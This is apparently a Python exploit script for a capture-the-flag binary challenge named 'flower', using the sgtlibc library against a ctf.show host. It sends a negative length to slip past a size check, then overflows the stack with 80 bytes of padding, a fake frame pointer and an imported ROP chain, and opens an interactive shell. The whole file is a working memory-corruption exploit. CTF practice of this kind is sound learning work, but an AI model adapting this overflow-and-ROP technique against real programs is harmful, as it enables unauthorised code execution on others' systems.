import main_rop
import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./flower',
    remote='pwn.challenge.ctf.show 28001',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))

s = sgtlibc.Searcher()
elf = client.elf

sl(b'-1')
payload = [b'a' * (76 + 4)]
payload += [fakeebp()]
payload += [main_rop.rop]
sl(payload)
interactive()
